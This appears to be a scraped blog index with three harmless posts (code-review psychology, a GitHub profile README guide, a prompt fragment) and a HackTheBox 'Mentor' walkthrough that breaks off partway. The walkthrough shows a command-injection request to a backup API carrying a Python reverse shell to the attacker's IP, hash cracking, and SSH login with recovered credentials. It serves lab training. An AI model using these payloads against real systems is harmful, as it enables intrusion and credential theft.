id=\"advanced-refactoring-prompt\"\u003eAdvanced Refactoring Prompt\u003c/h2\u003e\n\u003cp\u003eFor code improvement and refactoring, use this comprehensive prompt:\u003c/p\u003e","title":"AI-Powered Code Reviews: Comprehensive Prompts for Better Code Quality"},{"content":"The Code Review Paradox There\u0026rsquo;s a well-known observation in the programming world that perfectly captures the psychology of code reviews:\n\u0026ldquo;Ask a programmer to review 10 lines of code, he\u0026rsquo;ll find 10 issues. Ask him to do 500 lines and he\u0026rsquo;ll say it looks good.\u0026rdquo;\nThis humorous statement, originally shared by Giray √ñzil, reveals a fundamental truth about human psychology and code review effectiveness.\nWhy This Happens Cognitive Overload When faced with large amounts of code, reviewers experience cognitive overload. The human brain can only process so much information effectively before attention to detail begins to deteriorate.\nTime Pressure Large pull requests often come with implicit time pressure. Reviewers feel they need to complete the review quickly, leading to superficial examination rather than thorough analysis.\nFalse Sense of Complexity There\u0026rsquo;s a psychological tendency to assume that larger codebases have been more thoroughly tested by the author, leading to misplaced confidence.\nBest Practices for Effective Code Reviews Keep Reviews Small Aim for 200-400 lines maximum per review Break large features into smaller, logical chunks Submit incremental improvements rather than massive overhauls Focus on High-Impact Areas Prioritize security-sensitive code Pay special attention to error handling Review business logic thoroughly Use Checklists Create standardized checklists covering:\nCode style and formatting Error handling Performance considerations Security vulnerabilities Test coverage The Solution: Small, Frequent Reviews The most effective code reviews are:\nSmall in scope (under 400 lines) Focused on specific functionality Reviewed within 24-48 hours Accompanied by clear descriptions Conclusion Understanding the psychology behind code reviews helps us structure them more effectively. By keeping reviews small and manageable, we ensure that reviewers can maintain the attention to detail necessary to catch issues and maintain code quality.\nRemember: It\u0026rsquo;s better to have multiple small, thorough reviews than one large, superficial one.\n","permalink":"https://realspaceeagle.github.io/posts/code-review-psychology-lines-matter/","summary":"\u003ch2 id=\"the-code-review-paradox\"\u003eThe Code Review Paradox\u003c/h2\u003e\n\u003cp\u003eThere\u0026rsquo;s a well-known observation in the programming world that perfectly captures the psychology of code reviews:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u0026ldquo;Ask a programmer to review 10 lines of code, he\u0026rsquo;ll find 10 issues. Ask him to do 500 lines and he\u0026rsquo;ll say it looks good.\u0026rdquo;\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eThis humorous statement, originally shared by Giray √ñzil, reveals a fundamental truth about human psychology and code review effectiveness.\u003c/p\u003e\n\u003ch2 id=\"why-this-happens\"\u003eWhy This Happens\u003c/h2\u003e\n\u003ch3 id=\"cognitive-overload\"\u003eCognitive Overload\u003c/h3\u003e\n\u003cp\u003eWhen faced with large amounts of code, reviewers experience cognitive overload. The human brain can only process so much information effectively before attention to detail begins to deteriorate.\u003c/p\u003e","title":"The Psychology of Code Reviews: Why Line Count Matters"},{"content":"üöÄ Ultimate GitHub Profile README Generator Transform your GitHub profile into a stunning showcase with this comprehensive guide. Create dynamic stats, beautiful cards, and automated workflows that update automatically.\nüöÄ Quick Start - Basic Setup 1. Create Your Profile README # Create a repository with YOUR USERNAME # Example: if your username is \u0026#34;johndoe\u0026#34;, create repo named \u0026#34;johndoe\u0026#34; # Make it PUBLIC and initialize with README.md Important: The repository name must match your GitHub username exactly!\nüìä GitHub Stats Cards Most Popular Stats Card Add this to your README.md:\n![Your GitHub stats](https://github-readme-stats.vercel.app/api?username=YOUR_USERNAME\u0026amp;show_icons=true\u0026amp;theme=radical) Popular Themes:\ndark - Clean dark theme radical - Pink and purple gradients merko - Green matrix style gruvbox - Retro color palette tokyonight - Blue and purple night theme onedark - One Dark Pro theme cobalt - Blue cobalt theme synthwave - Retro synthwave highcontrast - High contrast mode dracula - Dracula theme Language Stats ![Top Langs](https://github-readme-stats.vercel.app/api/top-langs/?username=YOUR_USERNAME\u0026amp;layout=compact\u0026amp;theme=radical) üî• GitHub Streak Stats ![GitHub Streak](https://github-readme-streak-stats.herokuapp.com/?user=YOUR_USERNAME\u0026amp;theme=dark) üèÜ GitHub Trophy ![trophy](https://github-profile-trophy.vercel.app/?username=YOUR_USERNAME\u0026amp;theme=onedark) üìà Activity Graph ![Activity Graph](https://github-readme-activity-graph.vercel.app/graph?username=YOUR_USERNAME\u0026amp;theme=react-dark) üéØ Complete Profile Template Here\u0026rsquo;s a professional template you can customize:\n\u0026lt;h1 align=\u0026#34;center\u0026#34;\u0026gt;Hi üëã, I\u0026#39;m [Your Name]\u0026lt;/h1\u0026gt; \u0026lt;h3 align=\u0026#34;center\u0026#34;\u0026gt;A passionate [Your Role] from [Location]\u0026lt;/h3\u0026gt; \u0026lt;p align=\u0026#34;left\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://komarev.com/ghpvc/?username=YOUR_USERNAME\u0026amp;label=Profile%20views\u0026amp;color=0e75b6\u0026amp;style=flat\u0026#34; alt=\u0026#34;YOUR_USERNAME\u0026#34; /\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;p align=\u0026#34;left\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;https://github.com/ryo-ma/github-profile-trophy\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;https://github-profile-trophy.vercel.app/?username=YOUR_USERNAME\u0026#34; alt=\u0026#34;YOUR_USERNAME\u0026#34; /\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/p\u0026gt; - üî≠ I\u0026#39;m currently working on **[Project Name]** - üå± I\u0026#39;m currently learning **[Technologies]** - üëØ I\u0026#39;m looking to collaborate on **[Type of Projects]** - üí¨ Ask me about **[Your Expertise]** - üì´ How to reach me **[Your Email]** - ‚ö° Fun fact **[Something Interesting]** ### üîó Connect with me: \u0026lt;p align=\u0026#34;left\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;https://linkedin.com/in/YOUR_PROFILE\u0026#34; target=\u0026#34;blank\u0026#34;\u0026gt;\u0026lt;img align=\u0026#34;center\u0026#34; src=\u0026#34;https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/linked-in-alt.svg\u0026#34; alt=\u0026#34;YOUR_PROFILE\u0026#34; height=\u0026#34;30\u0026#34; width=\u0026#34;40\u0026#34; /\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;https://twitter.com/YOUR_HANDLE\u0026#34; target=\u0026#34;blank\u0026#34;\u0026gt;\u0026lt;img align=\u0026#34;center\u0026#34; src=\u0026#34;https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/twitter.svg\u0026#34; alt=\u0026#34;YOUR_HANDLE\u0026#34; height=\u0026#34;30\u0026#34; width=\u0026#34;40\u0026#34; /\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/p\u0026gt; ### üõ†Ô∏è Languages and Tools: \u0026lt;p align=\u0026#34;left\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;https://www.python.org\u0026#34; target=\u0026#34;_blank\u0026#34; rel=\u0026#34;noreferrer\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://raw.githubusercontent.com/devicons/devicon/master/icons/python/python-original.svg\u0026#34; alt=\u0026#34;python\u0026#34; width=\u0026#34;40\u0026#34; height=\u0026#34;40\u0026#34;/\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;https://www.javascript.com/\u0026#34; target=\u0026#34;_blank\u0026#34; rel=\u0026#34;noreferrer\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://raw.githubusercontent.com/devicons/devicon/master/icons/javascript/javascript-original.svg\u0026#34; alt=\u0026#34;javascript\u0026#34; width=\u0026#34;40\u0026#34; height=\u0026#34;40\u0026#34;/\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;!-- Add more icons from https://devicon.dev/ --\u0026gt; \u0026lt;/p\u0026gt; ### üìä GitHub Stats: \u0026lt;p\u0026gt;\u0026lt;img align=\u0026#34;left\u0026#34; src=\u0026#34;https://github-readme-stats.vercel.app/api/top-langs?username=YOUR_USERNAME\u0026amp;show_icons=true\u0026amp;locale=en\u0026amp;layout=compact\u0026amp;theme=radical\u0026#34; alt=\u0026#34;YOUR_USERNAME\u0026#34; /\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026amp;nbsp;\u0026lt;img align=\u0026#34;center\u0026#34; src=\u0026#34;https://github-readme-stats.vercel.app/api?username=YOUR_USERNAME\u0026amp;show_icons=true\u0026amp;locale=en\u0026amp;theme=radical\u0026#34; alt=\u0026#34;YOUR_USERNAME\u0026#34; /\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;img align=\u0026#34;center\u0026#34; src=\u0026#34;https://github-readme-streak-stats.herokuapp.com/?user=YOUR_USERNAME\u0026amp;theme=radical\u0026#34; alt=\u0026#34;YOUR_USERNAME\u0026#34; /\u0026gt;\u0026lt;/p\u0026gt; üé® Advanced Customizations Animated Snake Game (Shows Contribution Graph) Create .github/workflows/snake.yml in your profile repo:\nname: Generate Snake on: schedule: - cron: \u0026#34;0 */6 * * *\u0026#34; workflow_dispatch: jobs: build: runs-on: ubuntu-latest steps: - uses: Platane/snk@v2 with: github_user_name: YOUR_USERNAME outputs: | dist/github-snake.svg dist/github-snake-dark.svg?palette=github-dark - uses: crazy-max/ghaction-github-pages@v3 with: target_branch: output build_dir: dist env: GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} Add to README:\n![Snake animation](https://github.com/YOUR_USERNAME/YOUR_USERNAME/blob/output/github-snake-dark.svg) Typing Animation \u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;https://github.com/DenverCoder1/readme-typing-svg\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://readme-typing-svg.herokuapp.com?font=Fira+Code\u0026amp;pause=1000\u0026amp;color=F7F7F7\u0026amp;center=true\u0026amp;vCenter=true\u0026amp;width=435\u0026amp;lines=Full+Stack+Developer;Cloud+Security+Engineer;Open+Source+Contributor\u0026#34; alt=\u0026#34;Typing SVG\u0026#34; /\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;/p\u0026gt; Skill Icons (Beautiful) ![My Skills](https://skillicons.dev/icons?i=aws,python,js,docker,kubernetes,git,react,nodejs,mongodb) Available icons: https://skillicons.dev/\nLatest Blog Posts (Auto-Update) Create .github/workflows/blog-post-workflow.yml:\nname: Latest blog post workflow on: schedule: - cron: \u0026#39;0 * * * *\u0026#39; workflow_dispatch: jobs: update-readme-with-blog: runs-on: ubuntu-latest steps: - uses: actions/checkout@v2 - uses: gautamkrishnar/blog-post-workflow@master with: feed_list: \u0026#34;YOUR_BLOG_RSS_FEED_URL\u0026#34; Add to README:\n### üìï Latest Blog Posts \u0026lt;!-- BLOG-POST-LIST:START --\u0026gt; \u0026lt;!-- BLOG-POST-LIST:END --\u0026gt; üéØ Pro Tips 1. Use Shields.io Badges ![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge\u0026amp;logo=python\u0026amp;logoColor=ffdd54) ![AWS](https://img.shields.io/badge/AWS-%23FF9900.svg?style=for-the-badge\u0026amp;logo=amazon-aws\u0026amp;logoColor=white) 2. Add Metrics Use Metrics for advanced analytics\n3. Profile Generator Tools GitHub Profile README Generator GPRM Generator ProfileMe.dev 4. Color Coordination Stick to one theme across all cards for consistency\n5. Keep It Clean Don\u0026rsquo;t overload - pick 4-5 key elements that best represent you\nüöÄ Quick Copy-Paste Setup Replace YOUR_USERNAME with your GitHub username:\n\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt; # Hi there, I\u0026#39;m [Your Name] üëã ![Typing SVG](https://readme-typing-svg.herokuapp.com?font=Fira+Code\u0026amp;size=30\u0026amp;pause=1000\u0026amp;color=F75C7E\u0026amp;center=true\u0026amp;vCenter=true\u0026amp;width=600\u0026amp;lines=Full+Stack+Developer;Cloud+Engineer;Open+Source+Enthusiast) ### üî• Streak Stats ![GitHub Streak](https://github-readme-streak-stats.herokuapp.com/?user=YOUR_USERNAME\u0026amp;theme=radical) ### üìä GitHub Stats ![Stats](https://github-readme-stats.vercel.app/api?username=YOUR_USERNAME\u0026amp;show_icons=true\u0026amp;theme=radical) ### üíª Most Used Languages ![Languages](https://github-readme-stats.vercel.app/api/top-langs/?username=YOUR_USERNAME\u0026amp;layout=compact\u0026amp;theme=radical) ### üèÜ GitHub Trophies ![Trophies](https://github-profile-trophy.vercel.app/?username=YOUR_USERNAME\u0026amp;theme=radical\u0026amp;no-frame=true\u0026amp;row=1\u0026amp;column=7) \u0026lt;/div\u0026gt; üé® Theme Combinations That Work Great Dark Theme Setup - Stats: theme=dark - Streak: theme=dark - Trophy: theme=onedark - Typing: color=F7F7F7 Colorful Setup - Stats: theme=radical - Streak: theme=radical - Trophy: theme=radical - Typing: color=F75C7E Professional Setup - Stats: theme=github_dark - Streak: theme=github-dark-blue - Trophy: theme=onedark - Typing: color=0066CC üõ†Ô∏è Interactive README Generator üîß Customize Your Profile\r\u0026lt;div class=\u0026quot;input-group\u0026quot;\u0026gt;\r\u0026lt;label for=\u0026quot;github-username\u0026quot;\u0026gt;GitHub Username:\u0026lt;/label\u0026gt;\r\u0026lt;input type=\u0026quot;text\u0026quot; id=\u0026quot;github-username\u0026quot; placeholder=\u0026quot;realspaceeagle\u0026quot; value=\u0026quot;realspaceeagle\u0026quot;\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026quot;input-group\u0026quot;\u0026gt;\r\u0026lt;label for=\u0026quot;full-name\u0026quot;\u0026gt;Full Name:\u0026lt;/label\u0026gt;\r\u0026lt;input type=\u0026quot;text\u0026quot; id=\u0026quot;full-name\u0026quot; placeholder=\u0026quot;Your Name\u0026quot; value=\u0026quot;Araharan Loganayagam\u0026quot;\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026quot;input-group\u0026quot;\u0026gt;\r\u0026lt;label for=\u0026quot;role\u0026quot;\u0026gt;Role/Title:\u0026lt;/label\u0026gt;\r\u0026lt;input type=\u0026quot;text\u0026quot; id=\u0026quot;role\u0026quot; placeholder=\u0026quot;Cybersecurity Engineer\u0026quot; value=\u0026quot;Cybersecurity Engineer\u0026quot;\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026quot;input-group\u0026quot;\u0026gt;\r\u0026lt;label for=\u0026quot;location\u0026quot;\u0026gt;Location:\u0026lt;/label\u0026gt;\r\u0026lt;input type=\u0026quot;text\u0026quot; id=\u0026quot;location\u0026quot; placeholder=\u0026quot;London, UK\u0026quot; value=\u0026quot;London, UK\u0026quot;\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026quot;input-group\u0026quot;\u0026gt;\r\u0026lt;label for=\u0026quot;theme\u0026quot;\u0026gt;Theme:\u0026lt;/label\u0026gt;\r\u0026lt;select id=\u0026quot;theme\u0026quot;\u0026gt;\r\u0026lt;option value=\u0026quot;radical\u0026quot;\u0026gt;Radical (Pink/Purple)\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026quot;dark\u0026quot;\u0026gt;Dark\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026quot;tokyonight\u0026quot;\u0026gt;Tokyo Night\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026quot;dracula\u0026quot;\u0026gt;Dracula\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026quot;github_dark\u0026quot;\u0026gt;GitHub Dark\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026quot;onedark\u0026quot;\u0026gt;One Dark\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026quot;cobalt\u0026quot;\u0026gt;Cobalt\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026quot;synthwave\u0026quot;\u0026gt;Synthwave\u0026lt;/option\u0026gt;\r\u0026lt;/select\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;button onclick=\u0026quot;generateReadme()\u0026quot; class=\u0026quot;generate-btn\u0026quot;\u0026gt;üöÄ Generate README\u0026lt;/button\u0026gt;\rüìã Generated README.md\rüìã Copy to Clipboard\rüîß Advanced Features Auto-Updating Metrics ![Metrics](https://metrics.lecoq.io/YOUR_USERNAME?template=classic\u0026amp;config.timezone=YOUR_TIMEZONE) WakaTime Stats ![Coding Time](https://github-readme-stats.vercel.app/api/wakatime?username=YOUR_WAKATIME_USERNAME\u0026amp;theme=radical) Spotify Now Playing ![Spotify](https://novatorem.vercel.app/api/spotify?background_color=0d1117\u0026amp;border_color=ffffff) üéØ Examples in Action Check out these amazing GitHub profiles for inspiration:\nAnurag Hazra - Creator of github-readme-stats Abhishek Naidu - Awesome profile with great animations Gautam Krishna R - Blog post workflow creator This will give you a stunning GitHub profile that stands out! Remember to replace YOUR_USERNAME with your actual GitHub username and customize the content to match your skills and personality.\nPro tip: Visit your GitHub profile repository frequently to keep the README updated with your latest projects and achievements!\n","permalink":"https://realspaceeagle.github.io/posts/github-profile-readme-generator/","summary":"\u003ch1 id=\"-ultimate-github-profile-readme-generator\"\u003eüöÄ Ultimate GitHub Profile README Generator\u003c/h1\u003e\n\u003cp\u003eTransform your GitHub profile into a stunning showcase with this comprehensive guide. Create dynamic stats, beautiful cards, and automated workflows that update automatically.\u003c/p\u003e\n\u003ch2 id=\"-quick-start---basic-setup\"\u003eüöÄ Quick Start - Basic Setup\u003c/h2\u003e\n\u003ch3 id=\"1-create-your-profile-readme\"\u003e1. Create Your Profile README\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Create a repository with YOUR USERNAME\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Example: if your username is \u0026#34;johndoe\u0026#34;, create repo named \u0026#34;johndoe\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Make it PUBLIC and initialize with README.md\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cstrong\u003eImportant:\u003c/strong\u003e The repository name must match your GitHub username exactly!\u003c/p\u003e","title":"Ultimate GitHub Profile README Generator Guide"},{"content":"HackTheBox: Mentor Walkthrough This is a detailed walkthrough of the Mentor machine (10.10.11.193) from HackTheBox, covering reconnaissance, enumeration, exploitation, and privilege escalation techniques.\nInitial Setup First, let\u0026rsquo;s set up our environment and add the target to our hosts file:\n# Add to /etc/hosts 10.10.11.193 mentorquotes.htb # Set up variables LPORT=10.10.14.13 RPORT=10.10.11.193 Reconnaissance Initial Ping Test ping 10.10.11.193 Nmap Scanning Let\u0026rsquo;s start with a comprehensive nmap scan to identify open ports and services:\nsudo nmap -sC -sV -vv -oA nmap/mentor 10.10.11.193 Results:\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO6yWCATc | j2UeU/SgSa+wK2fP5ixsrHb6pgufdO378n+BLNiDB6ljwm3U3PPdbdQqGZo1K7Tfsz+ejZj1nV80RY= | 256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJjv9f3Jbxj42smHEXcChFPMNh1bqlAFHLi4Nr7w9fdv 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.52 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.52 (Ubuntu) |_http-title: Did not follow redirect to http://mentorquotes.htb/ Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Full Port Scan nmap -p- -oA allports -vvv 10.10.11.193 UDP Port Scan sudo nmap -sU --min-rate 10000 10.10.11.193 UDP Scan Results:\nPORT STATE SERVICE 161/udp open snmp 1050/udp closed cma 20154/udp closed unknown 28122/udp closed unknown 32772/udp closed sometimes-rpc8 58002/udp closed unknown Great! We found SNMP running on UDP port 161.\nWeb Enumeration Port 80 - HTTP Service Accessing http://10.10.11.193:80 redirects to http://mentorquotes.htb/. This appears to be a Flask application based on the server headers:\nHTTP/1.1 200 OK Date: Wed, 14 May 2025 12:56:00 GMT Server: Werkzeug/2.0.3 Python/3.6.9 Content-Type: text/html; charset=utf-8 Vary: Accept-Encoding Connection: close Content-Length: 5506 Subdomain Enumeration ffuf -u http://mentorquotes.htb -H \u0026#39;HOST: FUZZ.mentorquotes.htb\u0026#39; \\ -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -fw 18 -mc all Results:\n10.10.11.193 mentorquotes.htb api.mentorquotes.htb We discovered an API subdomain! Let\u0026rsquo;s add it to our hosts file:\n10.10.11.193 mentorquotes.htb api.mentorquotes.htb API Enumeration Visiting http://api.mentorquotes.htb reveals a FastAPI application:\nAccessing the documentation at http://api.mentorquotes.htb/docs shows the Swagger UI:\nThe API has several endpoints:\nAPI Authentication We need JWT authentication. Let\u0026rsquo;s test the registration and login functionality:\nWe can get a JWT token by signing up and logging in:\nAuthorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEyMzQ1NiIsImVtYWlsIjoi\\ MTIzNEBleGFtcGxlLmNvbSJ9.2VA3k2okByNuNtJ0vfrpgzdVCbN5N4aV_0d1vdGg5vM API Fuzzing Let\u0026rsquo;s fuzz for additional endpoints:\nffuf -request api.req -request-proto http \\ -w /opt/SecLists/Discovery/Web-Content/api/api-endpoints.txt -mc all We found additional endpoints including /admin:\nWe can see there\u0026rsquo;s a user james@mentorquotes.htb:\nSNMP Enumeration Let\u0026rsquo;s enumerate the SNMP service we found on UDP port 161:\nsnmpwalk -v2c -c public 10.10.11.193 Results:\niso.3.6.1.2.1.1.1.0 = STRING: \u0026#34;Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64\u0026#34; iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10 iso.3.6.1.2.1.1.3.0 = Timeticks: (1555164) 4:19:11.64 iso.3.6.1.2.1.1.4.0 = STRING: \u0026#34;Me \u0026lt;admin@mentorquotes.htb\u0026gt;\u0026#34; iso.3.6.1.2.1.1.5.0 = STRING: \u0026#34;mentor\u0026#34; iso.3.6.1.2.1.1.6.0 = STRING: \u0026#34;Sitting on the Dock of the Bay\u0026#34; iso.3.6.1.2.1.1.7.0 = INTEGER: 72 iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00 SNMP Community String Brute Force Let\u0026rsquo;s try different community strings:\npython3 /opt/snmpbrute.py -t 10.10.11.193 \\ -f /opt/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt -b Let\u0026rsquo;s try the \u0026ldquo;internal\u0026rdquo; community string:\nsnmpbulkwalk -v2c -c internal 10.10.11.193 | tee bulkwalk.out This reveals running processes with hrSWRunPath:\nCritical Finding: We discovered a hardcoded password in a process:\nSTRING: \u0026#34;/usr/local/bin/login.py kj23sadkj123as0-d213\u0026#34; Never put passwords as command line arguments!\nThis shows that if we can modify the Python script, it will rerun the program.\nExploitation Getting a Valid JWT Token First, let\u0026rsquo;s get a session ID for the james user:\nWith a valid JWT token:\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0Bt\\ ZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0 Now we can access the admin endpoints:\nCommand Injection via Backup Endpoint The backup endpoint appears vulnerable to command injection. Let\u0026rsquo;s prepare a reverse shell payload:\nexport RHOST=\u0026#34;10.10.14.13\u0026#34;;export RPORT=9001;python -c \u0026#39;import sys,socket,os,pty;\\ s=socket.socket();s.connect((os.getenv(\u0026#34;RHOST\u0026#34;),int(os.getenv(\u0026#34;RPORT\u0026#34;))));\\ [os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\u0026#34;sh\u0026#34;)\u0026#39; For use in JSON, we need to escape it:\nexport RHOST=\\\u0026#34;10.10.14.13\\\u0026#34;;export RPORT=9001;python -c \u0026#39;import sys,socket,os,pty;\\ s=socket.socket();s.connect((os.getenv(\\\u0026#34;RHOST\\\u0026#34;),int(os.getenv(\\\u0026#34;RPORT\\\u0026#34;))));\\ [os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\\u0026#34;sh\\\u0026#34;)\u0026#39; Sample Request:\n{ \u0026#34;path\u0026#34;:\u0026#34;/etc/passwd;export RHOST=\\\u0026#34;10.10.14.13\\\u0026#34;;export RPORT=9001;\\ python -c \u0026#39;import sys,socket,os,pty;s=socket.socket();\\ s.connect((os.getenv(\\\u0026#34;RHOST\\\u0026#34;),int(os.getenv(\\\u0026#34;RPORT\\\u0026#34;))));\\ [os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\\u0026#34;sh\\\u0026#34;)\u0026#39;\u0026#34; } Set up a netcat listener:\nrlwrap nc -nlvp 9001 Using nohup for Background Execution Since the server has limited workers, we need to use nohup to avoid hanging:\nPOST /admin/backup HTTP/1.1 Host: api.mentorquotes.htb Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwi\\ ZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0 Content-Type: application/json { \u0026#34;path\u0026#34;: \u0026#34;/etc/passwd; export RHOST=\\\u0026#34;10.10.14.13\\\u0026#34;; export RPORT=9001; \\ nohup python -c \u0026#39;import sys,socket,os,pty;s=socket.socket(); \\ s.connect((os.getenv(\\\u0026#34;RHOST\\\u0026#34;),int(os.getenv(\\\u0026#34;RPORT\\\u0026#34;)))); \\ [os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\\u0026#34;/bin/sh\\\u0026#34;)\u0026#39; #\u0026#34; } Post-Exploitation Container Analysis Once we get a shell, we\u0026rsquo;re in a Docker container. Let\u0026rsquo;s examine the environment:\n# View Dockerfile cat Dockerfile FROM python:3.6.9-alpine RUN apk --update --upgrade add --no-cache gcc musl-dev jpeg-dev zlib-dev libffi-dev cairo-dev pango-dev gdk-pixbuf-dev WORKDIR /app ENV HOME /home/svc ENV PATH /home/svc/.local/bin:${PATH} RUN python -m pip install --upgrade pip --user svc COPY requirements.txt requirements.txt RUN pip install -r requirements.txt RUN pip install pydantic[email] pyjwt EXPOSE 8000 COPY . . CMD [\u0026#34;python3\u0026#34;, \u0026#34;-m\u0026#34;, \u0026#34;uvicorn\u0026#34;, \u0026#34;app.main:app\u0026#34;, \u0026#34;--reload\u0026#34;, \u0026#34;--workers\u0026#34;, \u0026#34;100\u0026#34;, \u0026#34;--host\u0026#34;, \u0026#34;0.0.0.0\u0026#34;, \u0026#34;--port\u0026#34; ,\u0026#34;8000\u0026#34;] Database Configuration # /app/app/db.py DATABASE_URL = os.getenv(\u0026#34;DATABASE_URL\u0026#34;, \u0026#34;postgresql://postgres:postgres@172.22.0.1/mentorquotes_db\u0026#34;) Container Network ip addr 11: eth0@if12: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN\u0026gt; mtu 1500 qdisc noqueue state UP link/ether 02:42:ac:16:00:03 brd ff:ff:ff:ff:ff:ff inet 172.22.0.3/16 brd 172.22.255.255 scope global eth0 valid_lft forever preferred_lft forever The container is running with only 2 workers, which causes the server to hang:\nExtracting User Credentials From the API endpoints, we can extract user data including password hashes:\n[ { \u0026#34;id\u0026#34;: 1, \u0026#34;email\u0026#34;: \u0026#34;james@mentorquotes.htb\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;james\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;7ccdcd8c05b59add9c198d492b36a503\u0026#34; }, { \u0026#34;id\u0026#34;: 2, \u0026#34;email\u0026#34;: \u0026#34;svc@mentorquotes.htb\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;service_acc\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;53f22d0dfa10dce7e29cd31f4f953fd8\u0026#34; } ] Hash Cracking Using CrackStation, we can crack the MD5 hashes:\n53f22d0dfa10dce7e29cd31f4f953fd8:MD5:123meunomeeivani Privilege Escalation SSH Access With the cracked password, we can SSH to the service account:\nsshpass -p \u0026#39;123meunomeeivani\u0026#39; ssh service_acc@10.10.11.193 -t bash # or ssh svc@10.10.11.193 Host Enumeration Let\u0026rsquo;s check running processes:\nps -ef --forest | less -S We can see Docker containers running:\nroot 1684 1269 0 18:44 ? 00:00:00 \\_ /usr/bin/docker-proxy -proto tcp -host-ip 172.22.0.1 -host-port 5432 -container-ip 172.22.0.2 -container-port 5432 root 1794 1269 0 18:44 ? 00:00:00 \\_ /usr/bin/docker-proxy -proto tcp -host-ip 172.22.0.1 -host-port 8000 -container-ip 172.22.0.3 -container-port 8000 root 1918 1269 0 18:44 ? 00:00:00 \\_ 